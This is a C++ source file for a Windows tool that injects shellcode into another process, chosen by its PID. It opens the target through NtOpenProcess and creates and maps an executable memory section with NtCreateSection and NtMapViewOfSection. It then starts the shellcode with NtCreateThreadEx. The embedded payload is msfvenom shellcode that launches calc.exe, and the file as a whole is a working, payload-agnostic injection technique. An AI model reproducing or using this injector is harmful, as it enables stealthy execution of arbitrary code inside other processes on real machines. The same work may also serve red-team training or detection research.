#include <iostream>
#include "NTApi.h"
#include <Windows.h>
#include <ntstatus.h>



int main(int argc, char* argv[])
{

    DWORD pid;

    if (argc <= 1) 
    {
        printf("Usage: %s PID<int>", argv[0]);
        return 1;
    }
    else 
    {
        //convert the string argument to ulong
        char* end;
        pid = std::strtoul(argv[1], &end, 10);

        //Check if the conversion was succesfull 
        if (*end != '\0') {
            printf("Invalid PID format: %s, please provide a valid integer\n", argv[1]);
            return 1;
        }
    }


    //msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c -v shellcode
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



    //Get a handle on ntdll.dll
    HMODULE nthand = GetModuleHandle(L"ntdll.dll");
    //Get pointers to NtCreateSection
    FARPROC NCSp = GetProcAddress(nthand, "NtCreateSection");
    FARPROC NMVp = GetProcAddress(nthand, "NtMapViewOfSection");
    FARPROC UMVp = GetProcAddress(nthand, "NtUnmapViewOfSection");
    FARPROC NOPp = GetProcAddress(nthand, "NtOpenProcess");
    FARPROC NCTEp = GetProcAddress(nthand, "NtCreateThreadEx");


    //Define the functions that will be used
    NtCreateSection NCS = (NtCreateSection)NCSp;
    NtMapViewOfSection NMV = (NtMapViewOfSection)NMVp;
    NtUnmapViewOfSection UMV = (NtUnmapViewOfSection)UMVp;
    NtOpenProcess NOP = (NtOpenProcess)NOPp;
    NtCreateThreadEx NCTE = (NtCreateThreadEx)NCTEp;



    //NtOpenProcess
    HANDLE proc;
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)pid;
    cid.UniqueThread = (HANDLE)0;

    OBJECT_ATTRIBUTES oattr;
    InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);

    NTSTATUS stat = NOP(
        &proc, 
        PROCESS_ALL_ACCESS,
        &oattr, 
        &cid);

    if (stat == STATUS_SUCCESS) {
        printf("Handle opened: 0x%X\n", (int)proc);
    }
    else 
    {
        printf("NtOpenProcess failed with error code: 0x%X\n", stat);
        return 1;
    }

    //NtCreateSection
    HANDLE shand;
    LARGE_INTEGER sc_size = { sizeof(shellcode) };

    stat = NCS(
        &shand,
        SECTION_ALL_ACCESS,
        &oattr,
        &sc_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (stat == STATUS_SUCCESS) {
        printf("Section created: 0x%X\n", (int)shand);
    }
    else
    {
        printf("NtCreateSection failed with error code: 0x%X\n", stat);
        return 1;
    }

    //NtMapViewOfSection to local process
    PVOID local_mem = NULL;
    SIZE_T vSize = 0;

    stat = NMV(
        shand,
        GetCurrentProcess(),
        &local_mem,
        NULL,
        NULL,
        NULL,
        &vSize,
        SECTION_INHERIT::ViewUnmap,
        NULL,
        PAGE_READWRITE //PAGE_EXECUTE_READWRITE
    );

    if (stat == STATUS_SUCCESS) {
        printf("Section mapped: 0x%X\n", (int)local_mem);
    }
    else
    {
        printf("NtMapViewOfSection failed with error code: 0x%X\n", stat);
        return 1;
    }

    //Copy the shellcode to the section
    RtlCopyMemory(
        local_mem,
        &shellcode[0],
        sizeof(shellcode)
    );

    //NtMapViewOfSection to the opened process
    PVOID remote_mem = NULL;

    stat = NMV(
        shand,
        proc,
        &remote_mem,
        NULL,
        NULL,
        NULL,
        &vSize,
        SECTION_INHERIT::ViewUnmap,
        NULL,
        PAGE_EXECUTE_READ
    );

    if (stat == STATUS_SUCCESS) {
        printf("Section mapped in remote process: 0x%X\n", (int)remote_mem);
    }
    else
    {
        printf("NtMapViewOfSection failed with error code: 0x%X\n", stat);
        return 1;
    }

    printf("Attempting to execute the shellcode trough NtCreateThreadEx\n");
    //Execute shellcode trough NtCreateThreadEx
    HANDLE thand;

    stat = NCTE(
        &thand,
        STANDARD_RIGHTS_ALL,
        NULL,
        proc,
        remote_mem,
        NULL,
        false,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (stat == STATUS_SUCCESS) {
        printf("Remote thread created: 0x%X\n", (int)thand);
    }
    else
    {
        printf("NtCreateThreadEx failed with error code: 0x%X\n", stat);
        return 1;
    }
    

    //Unmap from local
    stat = UMV(GetCurrentProcess(), local_mem);


    printf("Closing handles..");
    CloseHandle(thand);
    CloseHandle(shand);
    CloseHandle(proc);
    return 0;
}

